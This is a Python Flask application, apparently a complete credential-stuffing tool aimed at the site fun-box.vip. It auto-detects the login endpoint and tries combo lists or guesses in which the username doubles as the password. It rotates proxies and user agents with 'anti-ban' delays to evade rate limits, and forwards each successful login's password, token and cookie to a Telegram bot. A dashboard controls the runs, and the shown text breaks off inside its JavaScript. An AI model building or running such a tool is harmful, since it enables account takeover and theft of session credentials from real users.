# ================================================================
# FUN-BOX.VIP ULTIMATE HUNTER - AUTO ENDPOINT DETECTION
# Developer: @k_p_x1
# Target: https://fun-box.vip
# ================================================================

import os, sys, re, time, random, threading, requests, json, secrets, io
import urllib3  # <-- تم إضافة هذا السطر
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for
from flask_cors import CORS
from collections import defaultdict

urllib3.disable_warnings()
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

# ================================================================
# PASSWORD CONFIG
# ================================================================
ADMIN_PASSWORD = "ASHEU38HSBHXJHSGUE8UDHUD88EG8E8KDMKX9W00WHJDIU8UEHXBJZJ8WGEIJXKOXLXLXOSGUDYDI8EHD8HDIDIJDOSKDNZMZIXGEIEHJEGE8R8R9ROLRDGJ83IR8DIDGRIFF8"

# ================================================================
# ENDPOINT AUTO-DETECTION
# ================================================================
ENDPOINT_FILE = "endpoint.txt"
BASE_URL = "https://fun-box.vip"

POSSIBLE_PATHS = [
    "/login", "/signin", "/log-in", "/sign-in",
    "/api/login", "/api/auth/login", "/api/v1/login", "/api/user/login",
    "/api/authenticate", "/api/signin", "/api/v1/auth/login",
    "/auth/login", "/auth/signin", "/user/login", "/account/login",
    "/account/signin", "/member/login", "/customer/login",
    "/session", "/sessions", "/login_check", "/check_login",
    "/authenticate", "/auth", "/sign_in", "/log_in",
    "/login.php", "/signin.php", "/index.php?route=login"
]

def detect_login_endpoint():
    """البحث التلقائي عن مسار تسجيل الدخول الصحيح"""
    if os.path.exists(ENDPOINT_FILE):
        with open(ENDPOINT_FILE, "r") as f:
            return f.read().strip()
    
    print("[*] Searching for login endpoint...")
    session = requests.Session()
    session.verify = False
    
    for path in POSSIBLE_PATHS:
        test_url = BASE_URL + path
        try:
            resp = session.post(test_url, data={"username": "test", "password": "test"}, timeout=10)
            if resp.status_code != 404:
                with open(ENDPOINT_FILE, "w") as f:
                    f.write(path)
                print(f"[+] Endpoint found: {path}")
                return path
        except:
            continue
    
    print("[!] No endpoint found, using default /login")
    with open(ENDPOINT_FILE, "w") as f:
        f.write("/login")
    return "/login"

LOGIN_ENDPOINT = detect_login_endpoint()
LOGIN_URL = BASE_URL + LOGIN_ENDPOINT

# ================================================================
# ANTI-BAN SYSTEM WITH SMART DELAY
# ================================================================
class AntiBanSystem:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0'
        ]
        self.proxies = []
        self.lock = threading.Lock()
        self.attempt_count = 0
        self.last_attempt_time = 0
        self.fail_count = 0
        self.smart_delay_active = False
        self.delay_minutes = 5

    def get_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': BASE_URL,
            'Referer': BASE_URL + '/',
            'Connection': 'keep-alive',
        }

    def can_attempt(self):
        current_time = time.time()
        if self.smart_delay_active:
            elapsed = current_time - self.last_attempt_time
            if elapsed < (self.delay_minutes * 60):
                return False
            else:
                self.smart_delay_active = False
                self.fail_count = 0
                return True
        
        if self.fail_count >= 5:
            self.smart_delay_active = True
            self.last_attempt_time = current_time
            return False
        
        if current_time - self.last_attempt_time < 2:
            return False
        
        self.last_attempt_time = current_time
        return True

    def record_fail(self):
        with self.lock:
            self.fail_count += 1
            if self.fail_count >= 5:
                self.smart_delay_active = True
                self.last_attempt_time = time.time()

    def record_success(self):
        with self.lock:
            self.fail_count = 0
            self.smart_delay_active = False

    def add_proxy(self, proxy):
        with self.lock:
            if proxy not in self.proxies:
                self.proxies.append(proxy)

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

# ================================================================
# GROUP SENDER SYSTEM (TELEGRAM)
# ================================================================
class GroupSender:
    def __init__(self):
        self.telegram_bot_token = ""
        self.telegram_chat_id = ""
        self.enabled = False

    def set_telegram(self, token, chat_id):
        self.telegram_bot_token = token
        self.telegram_chat_id = chat_id
        self.enabled = True

    def send_hit(self, username, password, token, cookie, user_id):
        if not self.enabled or not self.telegram_bot_token or not self.telegram_chat_id:
            return False

        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"""
🎯 *FUN-BOX.VIP HIT DETECTED*
═══════════════════════════════
📧 *USERNAME:* `{username}`
🔑 *PASSWORD:* `{password}`
🆔 *USER ID:* `{user_id or 'N/A'}`
🕐 *TIME:* `{timestamp}`
🎫 *TOKEN:* `{token[:30] if token else 'N/A'}...`
🍪 *COOKIE:* `{cookie[:30] if cookie else 'N/A'}...`
═══════════════════════════════
📁 *FULL DATA SENT AS FILES*
"""
            url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
            data = {"chat_id": self.telegram_chat_id, "text": message, "parse_mode": "Markdown"}
            response = requests.post(url, data=data, timeout=15)

            if response.status_code != 200:
                return False

            token_content = f"Username: {username}\nPassword: {password}\nToken: {token}\nCookie: {cookie}\nUserID: {user_id}\nTime: {timestamp}"
            token_file = io.BytesIO(token_content.encode('utf-8'))
            token_file.name = 'funbox_data.txt'
            files = {'document': (token_file.name, token_file, 'text/plain')}
            data = {'chat_id': self.telegram_chat_id}
            requests.post(
                f"https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument",
                files=files,
                data=data,
                timeout=15
            )
            return True
        except:
            return False

# ================================================================
# FUN-BOX.VIP HUNTER ENGINE
# ================================================================
class FunBoxHunter:
    def __init__(self):
        self.anti_ban = AntiBanSystem()
        self.group_sender = GroupSender()
        self.running = False
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.feed = []
        self.results = []
        self.current_testing = []
        self.lock = threading.Lock()
        self.combos = []
        self.names_list = []
        self.generated_accounts = []
        self.generation_mode = False

    def set_names_list(self, names_text):
        """توليد حسابات من قائمة الأسماء - Username = Password"""
        with self.lock:
            raw_names = [n.strip() for n in names_text.split('\n') if n.strip()]
            self.generated_accounts = []
            
            for name in raw_names:
                clean_name = re.sub(r'[^a-zA-Z0-9]', '', name.lower())
                if not clean_name:
                    continue
                self.generated_accounts.append((clean_name, clean_name))
                for i in range(1, 4):
                    variant = f"{clean_name}{i}"
                    self.generated_accounts.append((variant, variant))
            
            self.generation_mode = True if self.generated_accounts else False

    def add_combos(self, combo_list):
        with self.lock:
            self.combos.extend(combo_list)
            self.combos = list(dict.fromkeys(self.combos))

    def hunt_funbox(self, username, password):
        """محاولة تسجيل دخول عبر نموذج المتصفح"""
        if not self.anti_ban.can_attempt():
            return None

        try:
            session = requests.Session()
            session.verify = False
            session.headers.update(self.anti_ban.get_headers())
            
            proxy = self.anti_ban.get_proxy()
            if proxy:
                session.proxies = {"http": proxy, "https": proxy}
            
            # جلب الصفحة أولاً لأخذ الكوكيز والتوكنات
            session.get(BASE_URL + '/', timeout=10)
            
            # إرسال طلب POST إلى مسار تسجيل الدخول المكتشف
            login_data = {
                'username': username,
                'password': password
            }
            
            login_resp = session.post(
                LOGIN_URL,
                data=login_data,
                allow_redirects=True,
                timeout=15
            )
            
            # التحقق من النجاح
            if 'dashboard' in login_resp.url.lower() or 'home' in login_resp.url.lower() or 'welcome' in login_resp.text.lower():
                cookies = session.cookies.get_dict()
                cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
                token = cookies.get('token') or cookies.get('access_token') or cookies.get('session') or 'N/A'
                
                user_id = None
                user_match = re.search(r'"user_id":"([^"]+)"', login_resp.text, re.I)
                if user_match:
                    user_id = user_match.group(1)
                
                self.anti_ban.record_success()
                return {
                    'status': 'hit',
                    'username': username,
                    'password': password,
                    'token': token,
                    'cookie': cookie_str,
                    'user_id': user_id or username
                }
            else:
                self.anti_ban.record_fail()
                return {'status': 'bad'}
                
        except Exception as e:
            self.anti_ban.record_fail()
            return {'status': 'error', 'error': str(e)}

    def process_account(self, username, password):
        """معالجة حساب واحد"""
        result = self.hunt_funbox(username, password)
        
        with self.lock:
            self.checked += 1
            if result and result.get('status') == 'hit':
                self.hits += 1
                self.results.append(result)
                self.feed.append({
                    'type': 'hit',
                    'text': f"🎯 Fun-Box | {username} | 🔑 {password} | ✅ HIT",
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                self.current_testing = [{'username': username, 'status': 'hit'}]
                self.group_sender.send_hit(
                    username, password,
                    result.get('token', 'N/A'),
                    result.get('cookie', 'N/A'),
                    result.get('user_id', 'N/A')
                )
            elif result and result.get('status') == 'bad':
                self.bad += 1
                self.feed.append({
                    'type': 'bad',
                    'text': f"❌ Fun-Box | {username} | 🔑 {password} | BAD",
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                self.current_testing = [{'username': username, 'status': 'bad'}]
            else:
                self.feed.append({
                    'type': 'info',
                    'text': f"⚠️ Fun-Box | {username} | {result.get('error', 'Error')}",
                    'time': datetime.now().strftime('%H:%M:%S')
                })

# ================================================================
# STATE
# ================================================================
state = {
    'running': False,
    'checked': 0,
    'hits': 0,
    'bad': 0,
    'errors': 0,
    'feed': [],
    'results': [],
    'current_testing': [],
    'lock': threading.Lock(),
    'cpm': 0,
    'start_time': None,
    'generation_mode': False,
    'generated_count': 0
}

hunter = FunBoxHunter()

# ================================================================
# PREDATOR LOOP
# ================================================================
def hunter_loop():
    last_count = 0
    last_time = datetime.now()
    index = 0
    
    while state['running']:
        try:
            if hunter.generation_mode and hunter.generated_accounts:
                if index < len(hunter.generated_accounts):
                    username, password = hunter.generated_accounts[index]
                    index += 1
                    with state['lock']:
                        state['generated_count'] = index
                    hunter.process_account(username, password)
                else:
                    if hunter.generation_mode and hunter.generated_accounts:
                        index = 0
                        random.shuffle(hunter.generated_accounts)
                        with state['lock']:
                            state['feed'].append({
                                'type': 'info',
                                'text': f"🔄 Re-cycling {len(hunter.generated_accounts)} accounts",
                                'time': datetime.now().strftime('%H:%M:%S')
                            })
            else:
                if hunter.combos:
                    combo = hunter.combos.pop(0)
                    hunter.process_account(combo[0], combo[1])
                else:
                    time.sleep(5)
                    continue
            
            with state['lock']:
                state['checked'] = hunter.checked
                state['hits'] = hunter.hits
                state['bad'] = hunter.bad
                state['feed'] = hunter.feed[-80:]
                state['results'] = hunter.results[-50:]
                state['current_testing'] = hunter.current_testing
                if hunter.generation_mode:
                    state['generated_count'] = index
            
            now = datetime.now()
            elapsed = (now - last_time).total_seconds()
            if elapsed >= 60:
                with state['lock']:
                    state['cpm'] = int((state['checked'] - last_count) / (elapsed / 60))
                last_count = state['checked']
                last_time = now
            
            time.sleep(random.uniform(1, 3))
            
        except Exception as e:
            with state['lock']:
                state['errors'] += 1
            time.sleep(2)

# ================================================================
# FLASK ROUTES
# ================================================================

@app.route('/')
def index():
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    password = request.json.get('password', '').strip()
    if password == ADMIN_PASSWORD:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Invalid password'})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('index'))
    return render_template_string(DASHBOARD_TEMPLATE)

@app.route('/api/generate/accounts', methods=['POST'])
def generate_accounts():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    names = request.json.get('names', '')
    if not names.strip():
        return jsonify({'success': False, 'error': 'No names provided'})
    
    hunter.set_names_list(names)
    accounts = hunter.generated_accounts
    
    if accounts:
        return jsonify({
            'success': True,
            'count': len(accounts),
            'accounts': accounts[:10]
        })
    return jsonify({'success': False, 'error': 'No accounts generated'})

@app.route('/api/start', methods=['POST'])
def start_hunter():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    if state['running']:
        return jsonify({'success': False, 'error': 'Already running'})
    
    state['running'] = True
    state['checked'] = 0
    state['hits'] = 0
    state['bad'] = 0
    state['errors'] = 0
    state['results'] = []
    state['feed'] = []
    state['current_testing'] = []
    state['start_time'] = datetime.now()
    state['cpm'] = 0
    state['generated_count'] = 0
    
    threading.Thread(target=hunter_loop, daemon=True).start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_hunter():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['running'] = False
    return jsonify({'success': True})

@app.route('/api/stats')
def get_stats():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({
        'success': True,
        'running': state['running'],
        'checked': state['checked'],
        'hits': state['hits'],
        'bad': state['bad'],
        'errors': state['errors'],
        'cpm': state.get('cpm', 0),
        'testing': len(state.get('current_testing', [])),
        'current_testing': state.get('current_testing', []),
        'start_time': int(state['start_time'].timestamp() * 1000) if state['start_time'] else None,
        'generated_count': state.get('generated_count', 0),
        'endpoint': LOGIN_ENDPOINT
    })

@app.route('/api/feed')
def get_feed():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'feed': state['feed'][:80]})

@app.route('/api/results')
def get_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    formatted = []
    for r in state['results'][:50]:
        formatted.append({
            'content': f"🎯 Fun-Box | {r.get('username', '')} | 🔑 {r.get('password', '')}",
            'token': r.get('token', 'N/A')[:20]
        })
    return jsonify({'success': True, 'results': formatted})

@app.route('/api/clear', methods=['POST'])
def clear_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state['results'] = []
    state['feed'] = []
    state['hits'] = 0
    state['bad'] = 0
    hunter.results = []
    hunter.feed = []
    hunter.hits = 0
    hunter.bad = 0
    return jsonify({'success': True})

@app.route('/api/upload/combo', methods=['POST'])
def upload_combo():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    
    content = request.json.get('content', '')
    combos = []
    for line in content.split('\n'):
        line = line.strip()
        if not line:
            continue
        if ':' in line:
            parts = line.split(':', 1)
            combos.append((parts[0].strip(), parts[1].strip()))
        elif '|' in line:
            parts = line.split('|', 1)
            combos.append((parts[0].strip(), parts[1].strip()))
        else:
            combos.append((line, line))
    
    hunter.add_combos(combos)
    return jsonify({'success': True, 'count': len(combos)})

@app.route('/api/upload/proxy', methods=['POST'])
def upload_proxy():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    proxies = [p.strip() for p in request.json.get('content', '').split('\n') if p.strip()]
    for proxy in proxies:
        hunter.anti_ban.add_proxy(proxy)
    return jsonify({'success': True, 'count': len(proxies)})

@app.route('/api/group/config', methods=['POST'])
def group_config():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    data = request.json or {}
    if data.get('telegram_token') and data.get('telegram_chat_id'):
        hunter.group_sender.set_telegram(data['telegram_token'], data['telegram_chat_id'])
    return jsonify({'success': True, 'enabled': hunter.group_sender.enabled})

@app.route('/api/endpoint/status')
def endpoint_status():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({
        'success': True,
        'endpoint': LOGIN_ENDPOINT,
        'url': LOGIN_URL,
        'file_exists': os.path.exists(ENDPOINT_FILE)
    })

# ================================================================
# HTML TEMPLATES
# ================================================================

LOGIN_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>FunBox Hunter</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#050508;font-family:'Share Tech Mono',monospace}
.login-box{background:rgba(0,0,0,0.92);border:1px solid rgba(0,255,65,0.15);border-radius:16px;padding:40px;width:400px;text-align:center}
.logo-text{font-family:'Orbitron',monospace;font-size:28px;color:#00ff41}
.logo-text span{color:#ff0044}
.subtitle{color:#006622;font-size:10px;margin:5px 0 15px;letter-spacing:3px}
.input-group input{width:100%;padding:14px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.08);border-radius:8px;color:#00ff41;font-size:16px;text-align:center;margin:10px 0}
.btn-login{width:100%;padding:14px;background:rgba(0,255,65,0.05);border:2px solid #00ff41;border-radius:8px;color:#00ff41;font-size:16px;cursor:pointer;font-family:'Orbitron',monospace}
.btn-login:hover{background:rgba(0,255,65,0.1)}
.error-msg{color:#ff0044;font-size:12px;margin-top:10px}
</style>
</head>
<body>
<div class="login-box">
    <div class="logo-text">FUN-BOX <span>HUNTER</span></div>
    <div class="subtitle">⚡ AUTO-ENDPOINT DETECTION</div>
    <div class="input-group">
        <input type="password" id="passInput" placeholder="🔑 Enter Password">
    </div>
    <button class="btn-login" id="loginBtn">⚡ ACCESS</button>
    <div id="errorMsg" class="error-msg"></div>
</div>
<script>
document.getElementById('loginBtn').addEventListener('click', function(){
    const password = document.getElementById('passInput').value.trim();
    if(!password){document.getElementById('errorMsg').textContent='⚠️ Enter password';return;}
    fetch('/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password})})
    .then(res=>res.json()).then(data=>{
        if(data.success){window.location.href='/dashboard';}
        else{document.getElementById('errorMsg').textContent='❌ '+data.error;}
    });
});
</script>
</body>
</html>'''

DASHBOARD_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>FunBox Hunter</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;padding:10px}
.container{max-width:1200px;margin:0 auto}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;border-radius:8px 8px 0 0}
.header h1{font-family:'Orbitron',monospace;font-size:20px;color:#00ff41}
.header h1 span{color:#ffd700}
.btn-logout{color:#ff0044;border:1px solid #ff0044;padding:8px 20px;border-radius:6px;cursor:pointer;background:transparent;text-decoration:none}
.btn{background:transparent;border:1px solid rgba(0,255,65,0.2);color:#00ff41;padding:10px 20px;border-radius:6px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:13px;transition:all 0.3s}
.btn:hover:not(:disabled){background:rgba(0,255,65,0.05)}
.btn-start{background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-stop{border-color:#ff0044;color:#ff0044}
.btn-generate{background:rgba(255,215,0,0.05);border-color:#ffd700;color:#ffd700}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:8px;padding:15px;margin-bottom:8px}
.stats-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin:10px 0;padding:15px;background:rgba(0,0,0,0.9);border:1px solid rgba(0,255,65,0.1);border-radius:10px}
.stat-item{text-align:center;padding:12px;border-radius:8px;background:rgba(0,0,0,0.6)}
.stat-item .number{font-size:28px;font-weight:700;display:block;font-family:'Orbitron',monospace}
.stat-item .label{font-size:9px;color:#006622;margin-top:4px;text-transform:uppercase}
.stat-item.hits .number{color:#00ff41}
.stat-item.bad .number{color:#ff0044}
.stat-item.total .number{color:#ffd700}
.stat-item.rate .number{color:#0088cc}
.stat-item.time .number{color:#0066ff;font-size:22px}
.stat-item.generated .number{color:#ff00ff}
.testing-box{background:rgba(255,170,0,0.05);border:1px solid rgba(255,170,0,0.2);border-radius:8px;padding:12px;margin:8px 0;min-height:50px}
.testing-box .content{color:#ffaa00;font-size:14px;font-weight:700;margin-top:5px}
.feed-container{max-height:150px;overflow-y:auto}
.feed-item{padding:4px 10px;font-size:10px;border-left:2px solid transparent;display:flex;gap:8px}
.feed-item.hit{background:rgba(0,255,65,0.04);border-left-color:#00ff41}
.feed-item.bad{background:rgba(255,0,68,0.06);border-left-color:#ff0044}
.feed-item .time{color:#006622;font-size:8px;min-width:50px}
.result-container{max-height:300px;overflow-y:auto}
.result-item{padding:6px 12px;font-size:10px;border-bottom:1px solid rgba(0,255,65,0.05);background:rgba(0,255,65,0.03)}
.generation-box{background:rgba(255,215,0,0.03);border:2px dashed rgba(255,215,0,0.15);border-radius:8px;padding:15px;margin:10px 0}
.generation-box textarea{width:100%;min-height:120px;padding:12px;background:rgba(0,0,0,0.8);border:1px solid rgba(255,215,0,0.1);border-radius:6px;color:#00ff41;font-family:'Share Tech Mono',monospace;font-size:12px;resize:vertical}
.generation-box textarea:focus{outline:none;border-color:#ffd700}
.group-config{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;padding:10px;background:rgba(0,0,0,0.5);border-radius:6px}
.group-config input{padding:6px 10px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:10px;width:100%}
.group-config label{color:#006622;font-size:9px}
.control-bar{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.endpoint-info{color:#0088cc;font-size:10px;margin:5px 0;padding:5px;background:rgba(0,136,204,0.05);border-radius:4px}
@media(max-width:768px){.stats-grid{grid-template-columns:repeat(3,1fr)}}
</style>
</head>
<body>
<div class="container">
    <header class="header">
        <h1>FUN-BOX <span>HUNTER</span> <span style="font-size:12px;color:#006622;">v2.0</span></h1>
        <a href="/logout" class="btn-logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
    </header>

    <div class="endpoint-info" id="endpointInfo">🔍 Endpoint: Loading...</div>

    <div class="generation-box">
        <div class="title" style="color:#ffd700;font-size:14px;margin-bottom:8px;"><i class="fas fa-users"></i> GENERATE ACCOUNTS (Username = Password)</div>
        <div class="hint" style="color:#006622;font-size:9px;">📝 Paste usernames (one per line) - Each will be used as BOTH username AND password</div>
        <textarea id="namesInput" placeholder="john&#10;mike&#10;sarah&#10;emma">john&#10;mike&#10;sarah&#10;emma</textarea>
        <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap;">
            <button class="btn btn-generate" id="generateBtn"><i class="fas fa-cogs"></i> GENERATE & START</button>
            <button class="btn btn-stop" id="stopBtn"><i class="fas fa-stop"></i> STOP</button>
            <span id="genStatus" style="color:#006622;font-size:11px;">⚪ Idle</span>
            <span id="genCount" style="color:#ffd700;font-size:11px;">📊 0 accounts</span>
        </div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#ffd700;margin-bottom:6px;">📢 TELEGRAM SHARING</div>
        <div class="group-config">
            <div><label>🤖 Bot Token</label><input type="text" id="tgToken" placeholder="Bot Token"></div>
            <div><label>💬 Chat ID</label><input type="text" id="tgChatId" placeholder="Chat ID"></div>
            <div><button class="btn" id="configGroupBtn" style="border-color:#ffd700;color:#ffd700;padding:6px 16px;">Apply</button></div>
        </div>
        <div id="groupStatus" style="color:#006622;font-size:10px;margin-top:5px;">⚪ Disabled</div>
    </div>

    <div class="stats-grid" id="statsGrid">
        <div class="stat-item hits"><span class="number" id="statHits">0</span><span class="label">✅ HITS</span></div>
        <div class="stat-item bad"><span class="number" id="statBad">0</span><span class="label">❌ BAD</span></div>
        <div class="stat-item total"><span class="number" id="statTotal">0</span><span class="label">📊 TOTAL</span></div>
        <div class="stat-item rate"><span class="number" id="statRate">0%</span><span class="label">📈 SUCCESS</span></div>
        <div class="stat-item time"><span class="number" id="statTime">00:00</span><span class="label">⏱ ELAPSED</span></div>
        <div class="stat-item generated"><span class="number" id="statGenerated">0</span><span class="label">📦 GEN</span></div>
    </div>

    <div class="testing-box">
        <div class="content" id="currentTesting">⏳ Waiting...</div>
    </div>

    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn"><i class="fas fa-play"></i> START</button>
            <button class="btn btn-stop" id="stopBtn2" disabled><i class="fas fa-stop"></i> STOP</button>
            <button class="btn" id="clearBtn" style="border-color:rgba(255,255,255,0.1);color:#006622;"><i class="fas fa-trash"></i> Clear</button>
            <span style="color:#006622;font-size:11px;">⚡ <span id="cpm">0</span> RPM</span>
            <span style="color:#ff0044;">⚠️ <span id="errorCount">0</span></span>
        </div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#00cc33;display:flex;gap:10px;margin-bottom:6px;">
            <span><i class="fas fa-broadcast"></i> FEED <span style="font-size:9px;color:#006622;" id="feedCount">(0)</span></span>
        </div>
        <div class="feed-container" id="feedContainer"><div style="text-align:center;padding:20px;color:#006622;font-size:11px;">⏳ Waiting...</div></div>
    </div>

    <div class="card">
        <div style="font-size:12px;color:#ffd700;display:flex;gap:10px;margin-bottom:6px;">
            <span><i class="fas fa-database"></i> HITS <span style="font-size:9px;color:#006622;" id="resultCount">(0)</span></span>
        </div>
        <div class="result-container" id="resultContainer"><div style="text-align:center;padding:20px;color:#006622;font-size:11px;">📭 No hits yet</div></div>
    </div>
</div>

<script>
const $ = id => document.getElementById(id);

async function api(endpoint, method='GET', data=null) {
    const opts = { method, headers: { 'Content-Type': 'application/json' } };
    if (data) opts.body = JSON.stringify(data);
    try {
        const res = await fetch(endpoint, opts);
        return await res.json();
    } catch (e) { return { success: false, error: e.message }; }
}

// Load endpoint status
async function loadEndpoint() {
    const res = await api('/api/endpoint/status');
    if (res.success) {
        document.getElementById('endpointInfo').textContent = '🔍 Endpoint: ' + res.endpoint + ' | URL: ' + res.url;
        document.getElementById('endpointInfo').style.color = '#00ff41';
    }
}
loadEndpoint();

// Generate
document.getElementById('generateBtn').addEventListener('click', async function() {
    const names = document.getElementById('namesInput').value;
    if (!names.trim()) { alert('⚠️ Paste some names first!'); return; }
    const btn = this;
    btn.disabled = true;
    btn.textContent = '⏳ Generating...';
    document.getElementById('genStatus').textContent = '🔄 Generating...';
    document.getElementById('genStatus').style.color = '#ffd700';
    
    const res = await api('/api/generate/accounts', 'POST', { names: names });
    if (res.success) {
        document.getElementById('genStatus').textContent = '✅ Ready - ' + res.count + ' accounts';
        document.getElementById('genStatus').style.color = '#00ff41';
        document.getElementById('genCount').textContent = '📊 ' + res.count + ' accounts';
        await api('/api/start', 'POST');
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn2').disabled = false;
        document.getElementById('genStatus').textContent = '▶️ Running';
        document.getElementById('genStatus').style.color = '#ff0044';
    } else {
        alert('❌ Error: ' + (res.error || 'Unknown'));
    }
    btn.disabled = false;
    btn.textContent = '<i class="fas fa-cogs"></i> GENERATE & START';
});

// Stop
document.getElementById('stopBtn').addEventListener('click', async function() {
    await api('/api/stop', 'POST');
    document.getElementById('startBtn').disabled = false;
    document.getElementById('stopBtn2').disabled = true;
    document.getElementById('genStatus').textContent = '⏹️ Stopped';
    document.getElementById('genStatus').style.color = '#006622';
});
document.getElementById('stopBtn2').addEventListener('click', function() {
    document.getElementById('stopBtn').click();
});

// Clear
document.getElementById('clearBtn').addEventListener('click', async function() {
    if (!confirm('Clear all?')) return;
    await api('/api/clear', 'POST');
});

// Group Config
document.getElementById('configGroupBtn').addEventListener('click', async function() {
    const data = {
        telegram_token: document.getElementById('tgToken').value,
        telegram_chat_id: document.getElementById('tgChatId').value
    };
    const res = await api('/api/group/config', 'POST', data);
    if (res.success) {
        document.getElementById('groupStatus').textContent = res.enabled ? '✅ Enabled' : '⚪ Disabled';
        document.getElementById('groupStatus').style.color = res.enabled ? '#00ff41' : '#006622';
        alert('✅ Group config applied!');
    }
});

// Update
async function updateStats() {
    try {
        const d = await api('/api/stats');
        if (!d.success) return;
        document.getElementById('statHits').textContent = d.hits || 0;
        document.getElementById('statBad').textContent = d.bad || 0;
        document.getElementById('statTotal').textContent = d.checked || 0;
        document.getElementById('statGenerated').textContent = d.generated_count || 0;
        const total = d.checked || 0;
        const hits = d.hits || 0;
        const rate = total > 0 ? ((hits / total) * 100).toFixed(1) : 0;
        document.getElementById('statRate').textContent = rate + '%';
        document.getElementById('cpm').textContent = d.cpm || 0;
        document.getElementById('errorCount').textContent = d.errors || 0;
        if (d.current_testing && d.current_testing.length > 0) {
            const ct = d.current_testing[0];
            document.getElementById('currentTesting').textContent = `${ct.username} | ${ct.status === 'hit' ? '✅ HIT' : ct.status === 'bad' ? '❌ BAD' : '🔄 Testing'}`;
            document.getElementById('currentTesting').style.color = ct.status === 'hit' ? '#00ff41' : ct.status === 'bad' ? '#ff0044' : '#ffaa00';
        } else {
            document.getElementById('currentTesting').textContent = '⏳ Waiting...';
            document.getElementById('currentTesting').style.color = '#ffaa00';
        }
        if (d.start_time) {
            const elapsed = Math.floor((Date.now() - d.start_time) / 1000);
            const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
            const secs = String(elapsed % 60).padStart(2, '0');
